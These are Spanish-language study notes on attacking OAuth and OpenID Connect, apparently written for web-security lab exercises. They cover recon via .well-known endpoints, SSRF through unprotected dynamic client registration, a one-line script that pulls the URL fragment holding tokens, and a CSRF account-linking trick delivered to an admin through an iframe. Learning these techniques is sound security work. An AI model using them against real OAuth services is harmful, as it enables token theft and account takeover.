## Recon

Cuando tengamos un endpoint que usa el OAuth deberemos hacer un GET a estos sitios para obtener toda la info posible : 

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
  ```

ejemplo :

url que hace la OAuth : oauth-0afb00fa04239b0781f9ecdb021f0010.oauth-server.net

GET : https://oauth-0afb00fa04239b0781f9ecdb021f0010.oauth-server.net/.well-known/oauth-authorization-server
## OpenID Connect

Si al server de auth le metes /.well-known/openid-configuration y te devuelve algo, usa openid

### Unprotected dynamic client registration

**Objetivo:** Permitir que una aplicación cliente se registre automáticamente ante un proveedor OpenID usando un **endpoint /registration** mediante una petición **POST**.

**Contenido de la solicitud:** Se envía en formato **JSON** e incluye información clave, como:

- Lista de **redirect_uris** autorizadas.
- **Nombre** y **logo** de la aplicación.
- Métodos de autenticación y claves públicas (**jwks_uri**).

**Riesgos de seguridad:** Algunos campos permiten **URIs** controladas por el atacante. Si el proveedor las accede sin validación, puede provocar vulnerabilidades como **SSRF (Server-Side Request Forgery)** de segundo orden.

 Parametros del OPENID

```json
{
 "application_type": "web",
  "redirect_uris": [
	   "https://client-app.com/callback",
		"https://client-app.com/callback2"
		 ],
 "client_name": "My Application",
  "logo_uri": "https://client-app.com/logo.png",
   "token_endpoint_auth_method": "client_secret_basic", 
   "jwks_uri": "https://client-app.com/my_public_keys.jwks", "userinfo_encrypted_response_alg": "RSA1_5", 
   "userinfo_encrypted_response_enc": "A128CBC-HS256",
    … 
    }
```


Script para pillar lo que hay delante del simbolo # :

`<script> window.location = '/?'+document.location.hash.substr(1) </script>`



Labs: 
-ssrf con uno de los parametros de OpenID
-linkear tu cuenta crea un token, si pillas el token y dropeas la request el token no se gastará y si lo envias en un iframe al admin su cuenta se linkeara con tus credenciales
